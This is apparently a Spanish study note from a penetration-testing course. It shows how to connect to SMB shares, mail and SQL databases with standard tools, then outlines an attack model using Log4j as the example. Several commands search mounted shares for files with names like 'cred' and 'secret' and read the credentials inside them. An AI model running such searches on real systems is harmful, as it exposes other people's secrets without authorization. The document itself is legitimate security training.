---
tags:
  - HTB-Academy
  - Penetration-Tester
---

# Interactuar con Servicios Comunes

---

Las vulnerabilidades son comúnmente descubiertas por personas que usan y entienden la tecnología, un protocolo o un servicio. A medida que evolucionamos en este campo, encontraremos diferentes servicios con los que interactuar, y necesitaremos evolucionar y aprender nuevas tecnologías constantemente.

Para tener éxito en atacar un servicio, necesitamos saber su propósito, cómo interactuar con él, qué herramientas podemos usar y qué podemos hacer con él. Esta sección se centrará en los servicios comunes y en cómo podemos interactuar con ellos.

---

## Servicios de Compartir Archivos

Un servicio de intercambio de archivos es un tipo de servicio que proporciona, media y monitorea la transferencia de archivos de computadora. Hace años, las empresas solían usar solo servicios internos para compartir archivos, como SMB, NFS, FTP, TFTP, SFTP, pero a medida que crece la adopción de la nube, la mayoría de las empresas ahora también tienen servicios en la nube de terceros como Dropbox, Google Drive, OneDrive, SharePoint u otras formas de almacenamiento de archivos como AWS S3, Azure Blob Storage o Google Cloud Storage. Estaremos expuestos a una mezcla de servicios internos y externos para compartir archivos, y debemos estar familiarizados con ellos.

Esta sección se centrará en los servicios internos, pero esto puede aplicarse al almacenamiento en la nube sincronizado localmente con servidores y estaciones de trabajo.

---

## Bloque de Mensajes del Servidor (SMB)

SMB se usa comúnmente en redes de Windows, y a menudo encontraremos carpetas compartidas en una red de Windows. Podemos interactuar con SMB utilizando la GUI, CLI o herramientas. Cubramos algunas formas comunes de interactuar con SMB usando Windows y Linux.

#### Windows

Hay diferentes formas en que podemos interactuar con una carpeta compartida usando Windows, y exploraremos un par de ellas. En Windows GUI, podemos presionar `[WINKEY] + [R]` para abrir el cuadro de diálogo Ejecutar y escribir la ubicación de compartir archivo, por ejemplo: `\\192.168.220.129\Finance\`

![texto](https://academy.hackthebox.com/storage/modules/116/windows_run_sharefolder2.jpg)

Supongamos que la carpeta compartida permite la autenticación anónima, o estamos autenticados con un usuario que tiene privilegios sobre esa carpeta compartida. En ese caso, no recibiremos ninguna forma de solicitud de autenticación, y mostrará el contenido de la carpeta compartida.

![imagen](https://academy.hackthebox.com/storage/modules/116/finance_share_folder2.jpg)

Si no tenemos acceso, recibiremos una solicitud de autenticación.

![texto](https://academy.hackthebox.com/storage/modules/116/auth_request_share_folder2.jpg)

Windows tiene dos shells de línea de comandos: el [Shell de comando](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands) y [PowerShell](https://docs.microsoft.com/en-us/powershell/scripting/overview). Cada shell es un programa de software que proporciona comunicación directa entre nosotros y el sistema operativo o aplicación, proporcionando un entorno para automatizar las operaciones de TI.

Discutamos algunos comandos para interactuar con el intercambio de archivos usando Command Shell (`CMD`) y `PowerShell`. El comando [dir](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dir) muestra una lista de los archivos y subdirectorios de un directorio.

#### CMD Windows - DIR

  Interactuar con Servicios Comunes

```cmd-session
C:\htb> dir \\192.168.220.129\Finance\

Volume in drive \\192.168.220.129\Finance has no label.
Volume Serial Number is ABCD-EFAA

Directory of \\192.168.220.129\Finance

02/23/2022  11:35 AM    <DIR>          Contracts
               0 File(s)          4,096 bytes
               1 Dir(s)  15,207,469,056 bytes free
```

El comando [uso neto](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/gg651155\(v=ws.11\)) conecta una computadora o desconecta una computadora de un recurso compartido o muestra información sobre las conexiones de la computadora. Podemos conectarnos a un archivo compartido con el siguiente comando y asignar su contenido a la letra de la unidad `n`.

#### Windows CMD - Uso neto

  Interactuar con Servicios Comunes

```cmd-session
C:\htb> net use n: \\192.168.220.129\Finance

The command completed successfully.
```

También podemos proporcionar un nombre de usuario y contraseña para autenticarse en el recurso compartido.

  Interactuar con Servicios Comunes

```cmd-session
C:\htb> net use n: \\192.168.220.129\Finance /user:plaintext Password123

The command completed successfully.
```

Con la carpeta compartida asignada como el `n` drive, podemos ejecutar comandos de Windows como si esta carpeta compartida estuviera en nuestro ordenador local. Encontremos cuántos archivos contienen la carpeta compartida y sus subdirectorios.

#### CMD Windows - DIR

  Interactuar con Servicios Comunes

```cmd-session
C:\htb> dir n: /a-d /s /b | find /c ":\"

29302
```

Encontramos 29.302 archivos. Caminemos por la orden:

  Interactuar con Servicios Comunes

```shell-session
dir n: /a-d /s /b | find /c ":\"
```

|**Sintaxis**|**Descripción**|
|---|---|
|`dir`|Aplicación|
|`n:`|Directorio o unidad para buscar|
|`/a-d`|`/a` es el atributo y `-d` significa no directorios|
|`/s`|Muestra archivos en un directorio especificado y en todos los subdirectorios|
|`/b`|Utiliza formato desnudo (sin información de encabezado o resumen)|

El siguiente comando `| find /c ":\\"` procesar la salida de `dir n: /a-d /s /b` para contar cuántos archivos existen en el directorio y subdirectorios. Puedes usar `dir /?` para ver la ayuda completa. Buscar a través de 29,302 archivos consume mucho tiempo, las utilidades de scripting y línea de comandos pueden ayudarnos a acelerar la búsqueda. Con `dir` podemos buscar nombres específicos en archivos como:

- credo
- contraseña
- usuarios
- secretos
- clave
- Extensiones de archivo comunes para código fuente como: .cs, .c, .go, .java, .php, .asp, .aspx, .html.

  Interactuar con Servicios Comunes

```cmd-session
C:\htb>dir n:\*cred* /s /b

n:\Contracts\private\credentials.txt


C:\htb>dir n:\*secret* /s /b

n:\Contracts\private\secret.txt
```

Si queremos buscar una palabra específica dentro de un archivo de texto, podemos utilizar [encontrar](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr).

#### Windows CMD - Findstr

  Interactuar con Servicios Comunes

```cmd-session
c:\htb>findstr /s /i cred n:\*.*

n:\Contracts\private\secret.txt:file with all credentials
n:\Contracts\private\credentials.txt:admin:SecureCredentials!
```

Podemos encontrar más `findstr` ejemplos [aquí](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr#examples).

#### PowerShell Windows

PowerShell fue diseñado para ampliar las capacidades del shell de Comando para ejecutar comandos de PowerShell llamados `cmdlets`. Los cmdlets son similares a los comandos de Windows, pero proporcionan un lenguaje de scripting más extensible. Podemos ejecutar comandos de Windows y cmdlets de PowerShell en PowerShell, pero el shell de comandos solo puede ejecutar comandos de Windows y no cmdlets de PowerShell. Repliquemos los mismos comandos ahora usando Powershell.

#### PowerShell Windows

  Interactuar con Servicios Comunes

```powershell-session
PS C:\htb> Get-ChildItem \\192.168.220.129\Finance\

    Directory: \\192.168.220.129\Finance

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/23/2022   3:27 PM                Contracts
```

En lugar de `net use`, podemos usar `New-PSDrive` en PowerShell.

  Interactuar con Servicios Comunes

```powershell-session
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"

Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
----           ---------     --------- --------      ----                                               ---------------
N                                      FileSystem    \\192.168.220.129\Finance
```

Para proporcionar un nombre de usuario y contraseña con Powershell, necesitamos crear un [PSObjeto de credencial](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential). Ofrece una forma centralizada de administrar nombres de usuario, contraseñas y credenciales.

#### Windows PowerShell - Objeto PSCredential

  Interactuar con Servicios Comunes

```powershell-session
PS C:\htb> $username = 'plaintext'
PS C:\htb> $password = 'Password123'
PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred

Name           Used (GB)     Free (GB) Provider      Root                                                              CurrentLocation
----           ---------     --------- --------      ----                                                              ---------------
N                                      FileSystem    \\192.168.220.129\Finance
```

En PowerShell, podemos usar el comando `Get-ChildItem` o la variante corta `gci` en lugar del comando `dir`.

#### Windows PowerShell - GCI

  Interactuar con Servicios Comunes

```powershell-session
PS C:\htb> N:
PS N:\> (Get-ChildItem -File -Recurse | Measure-Object).Count

29302
```

Podemos usar la propiedad `-Include` para encontrar elementos específicos del directorio especificado por el parámetro Ruta.

  Interactuar con Servicios Comunes

```powershell-session
PS C:\htb> Get-ChildItem -Recurse -Path N:\ -Include *cred* -File

    Directory: N:\Contracts\private

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/23/2022   4:36 PM             25 credentials.txt
```

El `Select-String` cmdlet utiliza la coincidencia de expresiones regulares para buscar patrones de texto en cadenas de entrada y archivos. Podemos usar `Select-String` similar a `grep` en UNIX o `findstr.exe` en Windows.

#### Windows PowerShell - Seleccionar cadena

  Interactuar con Servicios Comunes

```powershell-session
PS C:\htb> Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List

N:\Contracts\private\secret.txt:1:file with all credentials
N:\Contracts\private\credentials.txt:1:admin:SecureCredentials!
```

CLI permite que las operaciones de TI automaticen tareas rutinarias como la administración de cuentas de usuario, las copias de seguridad nocturnas o la interacción con muchos archivos. Podemos realizar operaciones de manera más eficiente mediante el uso de scripts que la interfaz de usuario o GUI.

#### Linux

Las máquinas Linux (UNIX) también se pueden usar para navegar y montar acciones SMB. Tenga en cuenta que esto se puede hacer si el servidor de destino es una máquina Windows o un servidor Samba. Aunque algunas distribuciones de Linux admiten una GUI, nos centraremos en las utilidades y herramientas de línea de comandos de Linux para interactuar con SMB. Cubramos cómo montar acciones de SMB para interactuar con directorios y archivos localmente.

#### Linux - Monte

  Interactuar con Servicios Comunes

```shell-session
vcrdcr@htb[/htb]$ sudo mkdir /mnt/Finance
vcrdcr@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
```

Como alternativa, podemos usar un archivo de credenciales.

  Interactuar con Servicios Comunes

```shell-session
vcrdcr@htb[/htb]$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
```

El archivo `credentialfile` tiene que estar estructurado así:

#### Archivo de Credenciales

Código: txt

```txt
username=plaintext
password=Password123
domain=.
```

Nota: Necesitamos instalar `cifs-utils` para conectarse a una carpeta compartida SMB. Para instalarlo podemos ejecutar desde la línea de comandos `sudo apt install cifs-utils`.

Una vez que se monta una carpeta compartida, puede usar herramientas comunes de Linux, como `find` o `grep` para interactuar con la estructura de archivos. Busquemos un nombre de archivo que contenga la cadena `cred`:

#### Linux - Encuentra

  Interactuar con Servicios Comunes

```shell-session
vcrdcr@htb[/htb]$ find /mnt/Finance/ -name *cred*

/mnt/Finance/Contracts/private/credentials.txt
```

A continuación, encontremos archivos que contengan la cadena `cred`:

  Interactuar con Servicios Comunes

```shell-session
vcrdcr@htb[/htb]$ grep -rn /mnt/Finance/ -ie cred

/mnt/Finance/Contracts/private/credentials.txt:1:admin:SecureCredentials!
/mnt/Finance/Contracts/private/secret.txt:1:file with all credentials
```

---

## Otros Servicios

Hay otros servicios de intercambio de archivos como FTP, TFTP y NFS que podemos adjuntar (montar) utilizando diferentes herramientas y comandos. Sin embargo, una vez que montamos un servicio de intercambio de archivos, debemos entender que podemos usar las herramientas disponibles en Linux o Windows para interactuar con archivos y directorios. A medida que descubrimos nuevos servicios para compartir archivos, tendremos que investigar cómo funcionan y qué herramientas podemos utilizar para interactuar con ellos.

#### Correo electrónico

Normalmente necesitamos dos protocolos para enviar y recibir mensajes, uno para enviar y otro para recibir. El Simple Mail Transfer Protocol (SMTP) es un protocolo de entrega de correo electrónico utilizado para enviar correo a través de Internet. Del mismo modo, se debe usar un protocolo de soporte para recuperar un correo electrónico de un servicio. Hay dos protocolos principales que podemos usar POP3 e IMAP.

Podemos utilizar un cliente de correo como [Evolución](https://wiki.gnome.org/Apps/Evolution), el administrador de información personal oficial y el cliente de correo para el entorno de escritorio de GNOME. Podemos interactuar con un servidor de correo para enviar o recibir mensajes con un cliente de correo. Para instalar Evolution, podemos usar el siguiente comando:

#### Linux - Instalar Evolution

  Interactuar con Servicios Comunes

```shell-session
vcrdcr@htb[/htb]$ sudo apt-get install evolution
...SNIP...
```

Nota: Si aparece un error al iniciar la evolución que indica "bwrap: Can't create file at ...", utilice este comando para iniciar la evolución `export WEBKIT_FORCE_SANDBOX=0 && evolution`.

#### Video - Conexión a IMAP y SMTP usando Evolution

Haga clic en la imagen a continuación para ver una breve demostración de video.

[![Evolución](https://academy.hackthebox.com/storage/modules/116/ConnectToIMAPandSMTP.jpg)](https://www.youtube.com/watch?v=xelO2CiaSVs)

Podemos utilizar el nombre de dominio o la dirección IP del servidor de correo. Si el servidor utiliza SMTPS o IMAPS, necesitaremos el método de cifrado adecuado (TLS en un puerto dedicado o STARTTLS después de la conexión). Podemos usar el `Check for Supported Types` opción en autenticación para confirmar si el servidor admite nuestro método seleccionado.

#### Bases de datos

Las bases de datos se utilizan típicamente en las empresas, y la mayoría de las empresas las utilizan para almacenar y administrar información. Existen diferentes tipos de bases de datos, como bases de datos jerárquicas, bases de datos NoSQL (o no relacionales) y bases de datos relacionales SQL. Nos centraremos en las bases de datos relacionales SQL y las dos bases de datos relacionales más comunes llamadas MySQL y MSSQL. Tenemos tres formas comunes de interactuar con las bases de datos:

|||
|---|---|
|`1.`|Utilidades de la Línea de Comando (`mysql` o `sqsh`)|
|`2.`|Lenguajes de Programación|
|`3.`|Una aplicación GUI para interactuar con bases de datos como HeidiSQL, MySQL Workbench o SQL Server Management Studio.|

#### Ejemplo de mySQL

![texto](https://academy.hackthebox.com/storage/modules/116/3_way_to_interact_with_MySQL.png)

Exploremos las utilidades de línea de comandos y una aplicación GUI.

---

## Utilidades de la Línea de Comando

#### MSSQL

Para interactuar con [MSSQL (Servidor Microsoft SQL)](https://www.microsoft.com/en-us/sql-server/sql-server-downloads) con Linux podemos usar [sqsh](https://en.wikipedia.org/wiki/Sqsh) o [sqlcmd](https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility) si estás usando Windows. `Sqsh` es mucho más que un mensaje amistoso. Su objetivo es proporcionar gran parte de la funcionalidad proporcionada por un shell de comandos, como variables, aliasing, redirección, tuberías, back-grounding, control de trabajos, historial, sustitución de comandos y configuración dinámica. Podemos iniciar una sesión SQL interactiva de la siguiente manera:

#### Linux - SQSH

  Interactuar con Servicios Comunes

```shell-session
vcrdcr@htb[/htb]$ sqsh -S 10.129.20.13 -U username -P Password123
```

El `sqlcmd` la utilidad le permite ingresar sentencias Transact-SQL, procedimientos del sistema y archivos de script a través de una variedad de modos disponibles:

- En el símbolo del sistema.
- En el Editor de consultas en modo SQLCMD.
- En un archivo de script de Windows.
- En un paso de trabajo del sistema operativo (Cmd.exe) de un trabajo del Agente de SQL Server.

#### Ventanas - SQLCMD

  Interactuar con Servicios Comunes

```cmd-session
C:\htb> sqlcmd -S 10.129.20.13 -U username -P Password123
```

Para aprender más sobre `sqlcmd` usage, puedes ver [Documentación de microsoft](https://docs.microsoft.com/en-us/sql/ssms/scripting/sqlcmd-use-the-utility).

#### MySQL

Para interactuar con [MySQL](https://en.wikipedia.org/wiki/MySQL), podemos usar binarios MySQL para Linux (`mysql`) o Windows (`mysql.exe`). MySQL viene preinstalado en algunas distribuciones de Linux, pero podemos instalar binarios MySQL para Linux o Windows usando esto [guía](https://dev.mysql.com/doc/mysql-getting-started/en/#mysql-getting-started-installing). Inicie una sesión SQL interactiva usando Linux:

#### Linux - MySQL

  Interactuar con Servicios Comunes

```shell-session
vcrdcr@htb[/htb]$ mysql -u username -pPassword123 -h 10.129.20.13
```

Podemos iniciar fácilmente una sesión SQL interactiva usando Windows:

#### Windows - MySQL

  Interactuar con Servicios Comunes

```cmd-session
C:\htb> mysql.exe -u username -pPassword123 -h 10.129.20.13
```

#### Aplicación GUI

Los motores de base de datos comúnmente tienen su propia aplicación GUI. MySQL tiene [Workbench MySQL](https://dev.mysql.com/downloads/workbench/) y MSSQL tiene [SQL Server Management Studio o SSMS](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms), podemos instalar esas herramientas en nuestro host de ataque y conectarnos a la base de datos. SSMS solo es compatible con Windows. Una alternativa es utilizar herramientas comunitarias como [dbeaver](https://github.com/dbeaver/dbeaver). [dbeaver](https://github.com/dbeaver/dbeaver) es una herramienta de base de datos multiplataforma para Linux, macOS y Windows que admite la conexión a múltiples motores de bases de datos como MSSQL, MySQL, PostgreSQL, entre otros, lo que nos facilita, como atacante, interactuar con servidores de bases de datos comunes.

Para instalar [dbeaver](https://github.com/dbeaver/dbeaver) usando un paquete Debian podemos descargar el paquete de lanzamiento .deb desde [https://github.com/dbeaver/dbeaver/releases](https://github.com/dbeaver/dbeaver/releases) y ejecute el siguiente comando:

#### Instalar dbeaver

  Interactuar con Servicios Comunes

```shell-session
vcrdcr@htb[/htb]$ sudo dpkg -i dbeaver-<version>.deb
```

Para iniciar el uso de la aplicación:

#### Ejecutar dbeaver

  Interactuar con Servicios Comunes

```shell-session
vcrdcr@htb[/htb]$ dbeaver &
```

Para conectarnos a una base de datos, necesitaremos un conjunto de credenciales, la IP de destino y el número de puerto de la base de datos, y el motor de base de datos al que intentamos conectarnos (MySQL, MSSQL u otro).

#### Video - Conexión a MSSQL DB usando dbeaver

Haga clic en la imagen a continuación para una breve demostración de video de la conexión a una base de datos MSSQL utilizando `dbeaver`.

[![MSSQL](https://academy.hackthebox.com/storage/modules/116/ConnectToMSSQL.jpg)](https://www.youtube.com/watch?v=gU6iQP5rFMw)

Haga clic en la imagen a continuación para una breve demostración de video de la conexión a una base de datos MySQL utilizando `dbeaver`.

#### Video - Conexión a MySQL DB usando dbeaver

[![MYSQL](https://academy.hackthebox.com/storage/modules/116/ConnectToMYSQL.jpg)](https://www.youtube.com/watch?v=PeuWmz8S6G8)

Una vez que tengamos acceso a la base de datos utilizando una utilidad de línea de comandos o una aplicación GUI, podemos usar common [Declaraciones transact-SQL](https://docs.microsoft.com/en-us/sql/t-sql/statements/statements?view=sql-server-ver15) enumerar bases de datos y tablas que contengan información confidencial, como nombres de usuario y contraseñas. Si tenemos los privilegios correctos, podríamos ejecutar comandos como la cuenta de servicio MSSQL. Más adelante en este módulo, discutiremos declaraciones y ataques comunes de Transact-SQL para bases de datos MSSQL y MySQL.

#### Herramientas

Es crucial familiarizarse con las utilidades de línea de comandos predeterminadas disponibles para interactuar con diferentes servicios. Sin embargo, a medida que avancemos en el campo, encontraremos herramientas que nos puedan ayudar a ser más eficientes. La comunidad comúnmente crea esas herramientas. Aunque, eventualmente, tendremos ideas sobre cómo se puede mejorar una herramienta o para crear nuestras propias herramientas, incluso si no somos desarrolladores a tiempo completo, cuanto más nos familiaricemos con la piratería. Cuanto más aprendemos, más nos encontramos buscando una herramienta que no existe, lo que puede ser una oportunidad para aprender y crear nuestras herramientas.

#### Herramientas para Interactuar con Servicios Comunes

|**SMB**|**FTP**|**Correo electrónico**|**Bases de datos**|
|---|---|---|---|
|[smbcliente](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)|[ftp](https://linux.die.net/man/1/ftp)|[Trueno](https://www.thunderbird.net/en-US/)|[mssql-cli](https://github.com/dbcli/mssql-cli)|
|[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)|[lftp](https://lftp.yar.ru/)|[Garras](https://www.claws-mail.org/)|[micli](https://github.com/dbcli/mycli)|
|[SMBMap](https://github.com/ShawnDEvans/smbmap)|[ncftp](https://www.ncftp.com/)|[Encantador](https://wiki.gnome.org/Apps/Geary)|[mssqlclient.p](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)|
|[Impactar](https://github.com/SecureAuthCorp/impacket)|[filezilla](https://filezilla-project.org/)|[MailPrimavera](https://getmailspring.com/)|[dbeaver](https://github.com/dbeaver/dbeaver)|
|[psexec.p](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)|[crossftp](http://www.crossftp.com/)|[mutt](http://www.mutt.org/)|[Workbench MySQL](https://dev.mysql.com/downloads/workbench/)|
|[smbexec.p](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)||[mailutils](https://mailutils.org/)|[SQL Server Management Studio o SSMS](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms)|
|||[enviarEmail](https://github.com/mogaal/sendemail)||
|||[desliza](http://www.jetmore.org/john/code/swaks/)||
|||[enviarmail](https://en.wikipedia.org/wiki/Sendmail)||

---

## Solución de problemas generales

Dependiendo de la versión de Windows o Linux con la que estemos trabajando o apuntando, podemos encontrar diferentes problemas al intentar conectarnos a un servicio.

Algunas razones por las que es posible que no tengamos acceso a un recurso:

- Autenticación
- Privilegios
- Conexión de Red
- Reglas del Firewall
- Apoyo al Protocolo

Tenga en cuenta que podemos encontrar diferentes errores dependiendo del servicio al que nos dirigimos. Podemos utilizar los códigos de error a nuestro favor y buscar documentación oficial o foros donde la gente resolviera un problema similar al nuestro.



# El Concepto de Ataques

---

Para comprender de manera efectiva los ataques a los diferentes servicios, debemos analizar cómo se pueden atacar estos servicios. Un concepto es un plan esbozado que se aplica a proyectos futuros. Como ejemplo, podemos pensar en el concepto de construir una casa. Muchas casas tienen un sótano, cuatro paredes y un techo. La mayoría de las casas se construyen de esta manera, y es un concepto que se aplica en todo el mundo. Los detalles más finos, como el material utilizado o el tipo de diseño, son flexibles y se pueden adaptar a los deseos y circunstancias individuales. Este ejemplo muestra que un concepto necesita una categorización general (piso, paredes, techo).

En nuestro caso, necesitamos crear un concepto para los ataques a todos los servicios posibles y dividirlo en categorías que resuman todos los servicios pero dejen los métodos de ataque individuales.

Para explicar un poco más claramente de lo que estamos hablando aquí, podemos tratar de agrupar los servicios SSH, FTP, SMB y HTTP nosotros mismos y descubrir qué tienen en común estos servicios. Entonces necesitamos crear una estructura que nos permita identificar los puntos de ataque de estos diferentes servicios usando un solo patrón.

Analizar puntos en común y crear plantillas de patrones que se ajusten a todos los casos concebibles no es un producto terminado, sino más bien un proceso que hace que estas plantillas de patrones se vuelvan cada vez más grandes. Por lo tanto, hemos creado una plantilla de patrón para este tema para que pueda enseñar y explicar mejor y de manera más eficiente el concepto detrás de los ataques.

#### El Concepto de Ataques

![](https://academy.hackthebox.com/storage/modules/116/attack_concept2.png)

El concepto se basa en cuatro categorías que se producen para cada vulnerabilidad. Primero, tenemos un `Source` que realiza la solicitud específica a un `Process` donde se activa la vulnerabilidad. Cada proceso tiene un conjunto específico de `Privileges` con el que se ejecuta. Cada proceso tiene una tarea con un objetivo específico o `Destination` para calcular nuevos datos o reenviarlos. Sin embargo, las especificaciones individuales y únicas bajo estas categorías pueden diferir de un servicio a otro.

Cada tarea y pieza de información sigue un patrón específico, un ciclo, que hemos hecho deliberadamente lineal. Esto es porque el `Destination` no siempre sirve como un `Source` y, por lo tanto, no se trata como una fuente de una nueva tarea.

Para que cualquier tarea llegue a existir, necesita una idea, información (`Source`), un proceso planificado para ello (`Processes`), y un objetivo específico (`Destination`) a lograr. Por lo tanto, la categoría de `Privileges` es necesario controlar adecuadamente el procesamiento de la información.

---

## Fuente

Podemos generalizar `Source` como fuente de información utilizada para la tarea específica de un proceso. Hay muchas maneras diferentes de pasar información a un proceso. El gráfico muestra algunos de los ejemplos más comunes de cómo se pasa la información a los procesos.

|**Fuente de Información**|**Descripción**|
|---|---|
|`Code`|Esto significa que los resultados del código de programa ya ejecutados se utilizan como fuente de información. Estos pueden provenir de diferentes funciones de un programa.|
|`Libraries`|Una biblioteca es una colección de recursos del programa, que incluye datos de configuración, documentación, datos de ayuda, plantillas de mensajes, código y subrutinas preconstruidos, clases, valores o especificaciones de tipo.|
|`Config`|Las configuraciones suelen ser valores estáticos o prescritos que determinan cómo el proceso procesa la información.|
|`APIs`|La interfaz de programación de aplicaciones (API) se utiliza principalmente como interfaz de programas para recuperar o proporcionar información.|
|`User Input`|Si un programa tiene una función que permite al usuario ingresar valores específicos utilizados para procesar la información en consecuencia, esta es la entrada manual de información por parte de una persona.|

La fuente es, por lo tanto, la fuente que se explota para vulnerabilidades. No importa qué protocolo se use porque las inyecciones de encabezado HTTP se pueden manipular manualmente, al igual que los desbordamientos de búfer. Por lo tanto, la fuente para esto se puede clasificar como `Code`. Así que echemos un vistazo más de cerca a la plantilla de patrones basada en una de las últimas vulnerabilidades críticas de las que la mayoría de nosotros hemos oído hablar.

#### Log4j

Un gran ejemplo es la vulnerabilidad crítica de Log4j ([CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-44228)) que se publicó a finales de 2021. Log4j es un framework o `Library` se utiliza para registrar mensajes de aplicaciones en Java y otros lenguajes de programación. Esta biblioteca contiene clases y funciones que otros lenguajes de programación pueden integrar. Para este propósito, la información está documentada, similar a un libro de registro. Además, el alcance de la documentación se puede configurar ampliamente. Como resultado, se ha convertido en un estándar dentro de muchos productos de software comercial y de código abierto. En este ejemplo, un atacante puede manipular el encabezado HTTP User-Agent e insertar una búsqueda JNDI como un comando destinado al Log4j `library`. En consecuencia, no se procesa el encabezado User-Agent real, como Mozilla 5.0, sino la búsqueda JNDI.

---

## Procesos

El `Process` se trata de procesar la información enviada desde la fuente. Estos se procesan de acuerdo con la tarea prevista determinada por el código del programa. Para cada tarea, el desarrollador especifica cómo se procesa la información. Esto puede ocurrir usando clases con diferentes funciones, cálculos y bucles. La variedad de posibilidades para esto es tan diversa como el número de desarrolladores en el mundo. En consecuencia, la mayoría de las vulnerabilidades se encuentran en el código del programa ejecutado por el proceso.

|**Componentes de Proceso**|**Descripción**|
|---|---|
|`PID`|El Process-ID (PID) identifica el proceso que se está iniciando o que ya se está ejecutando. Los procesos en ejecución ya tienen privilegios asignados, y los nuevos se inician en consecuencia.|
|`Input`|Esto se refiere a la entrada de información que podría ser asignada por un usuario o como resultado de una función programada.|
|`Data processing`|Las funciones codificadas de un programa dictan cómo se procesa la información recibida.|
|`Variables`|Las variables se utilizan como marcadores de posición para obtener información que diferentes funciones pueden procesar aún más durante la tarea.|
|`Logging`|Durante el registro, ciertos eventos se documentan y, en la mayoría de los casos, se almacenan en un registro o un archivo. Esto significa que cierta información permanece en el sistema.|

#### Log4j

El proceso de Log4j es registrar el User-Agent como una cadena usando una función y almacenarla en la ubicación designada. La vulnerabilidad en este proceso es la mala interpretación de la cadena, lo que lleva a la ejecución de una solicitud en lugar de registrar los eventos. Sin embargo, antes de ir más lejos en esta función, tenemos que hablar de privilegios.

---

## Privilegios

`Privileges`están presentes en cualquier sistema que controle los procesos. Estos sirven como un tipo de permiso que determina qué tareas y acciones se pueden realizar en el sistema. En términos simples, se puede comparar con un boleto de autobús. Si usamos un boleto destinado a una región en particular, podremos usar el autobús y, de lo contrario, no lo haremos. Estos privilegios (o en sentido figurado, nuestros billetes) también se pueden utilizar para diferentes medios de transporte, como aviones, trenes, barcos y otros. En los sistemas informáticos, estos privilegios sirven como control y segmentación de acciones para las que se necesitan diferentes permisos, controlados por el sistema. Por lo tanto, los derechos se verifican en función de esta categorización cuando un proceso necesita cumplir con su tarea. Si el proceso satisface estos privilegios y condiciones, el sistema aprueba la acción solicitada.Podemos dividir estos privilegios en las siguientes áreas:

|**Privilegios**|**Descripción**|
|---|---|
|`System`|Estos privilegios son los privilegios más altos que se pueden obtener, que permiten cualquier modificación del sistema. En Windows, este tipo de privilegio se llama `SYSTEM`, y en Linux, se llama `root`.|
|`User`|Los privilegios de usuario son permisos que se han asignado a un usuario específico. Por razones de seguridad, los usuarios separados a menudo se configuran para servicios particulares durante la instalación de distribuciones de Linux.|
|`Groups`|Los grupos son una categorización de al menos un usuario que tiene ciertos permisos para realizar acciones específicas.|
|`Policies`|Las políticas determinan la ejecución de comandos específicos de la aplicación, que también pueden aplicarse a usuarios individuales o agrupados y sus acciones.|
|`Rules`|Las reglas son los permisos para realizar acciones manejadas desde dentro de las propias aplicaciones.|

#### Log4j

Lo que hizo que la vulnerabilidad Log4j fuera tan peligrosa fue la `Privileges` que la implementación trajo. Los registros a menudo se consideran confidenciales porque pueden contener datos sobre el servicio, el sistema en sí o incluso los clientes. Por lo tanto, los registros generalmente se almacenan en ubicaciones a las que ningún usuario habitual debería poder acceder. En consecuencia, la mayoría de las aplicaciones con la implementación de Log4j se ejecutaron con los privilegios de un administrador. El proceso en sí explotó la biblioteca manipulando el User-Agent para que el proceso malinterpretara la fuente y condujera a la ejecución del código suministrado por el usuario.

---

## Destino

Cada tarea tiene al menos un propósito y objetivo que debe cumplirse. Lógicamente, si faltara algún cambio en el conjunto de datos o no se almacenara o reenviara en cualquier lugar, la tarea sería generalmente innecesaria. El resultado de dicha tarea se almacena en algún lugar o se reenvía a otro punto de procesamiento. Por lo tanto, hablamos aquí de la `Destination` donde se realizarán los cambios. Dichos puntos de procesamiento pueden apuntar a un proceso local o remoto. Por lo tanto, a nivel local, los archivos o registros locales pueden ser modificados por el proceso o ser enviados a otros servicios locales para su uso posterior. Sin embargo, esto no excluye la posibilidad de que el mismo proceso también pueda reutilizar los datos resultantes. Si el proceso se completa con el almacenamiento de datos o su reenvío, se cierra el ciclo que conduce a la finalización de la tarea.

|**Destino**|**Descripción**|
|---|---|
|`Local`|El área local es el entorno del sistema en el que se produjo el proceso. Por lo tanto, los resultados y los resultados de una tarea se procesan aún más mediante un proceso que incluye cambios en los conjuntos de datos o el almacenamiento de los datos.|
|`Network`|El área de red es principalmente una cuestión de reenviar los resultados de un proceso a una interfaz remota. Esto puede ser una dirección IP y sus servicios o incluso redes enteras. Los resultados de tales procesos también pueden influir en la ruta bajo ciertas circunstancias.|

#### Log4j

La mala interpretación del User-Agent conduce a una búsqueda JNDI que se ejecuta como un comando desde el sistema con privilegios de administrador y consulta un servidor remoto controlado por el atacante, que en nuestro caso es el `Destination` en nuestro concepto de ataques. Esta consulta solicita una clase Java creada por el atacante y se manipula para sus propios fines. El código Java consultado dentro de la clase Java manipulada se ejecuta en el mismo proceso, lo que lleva a una ejecución remota de código (`RCE`) vulnerabilidad.

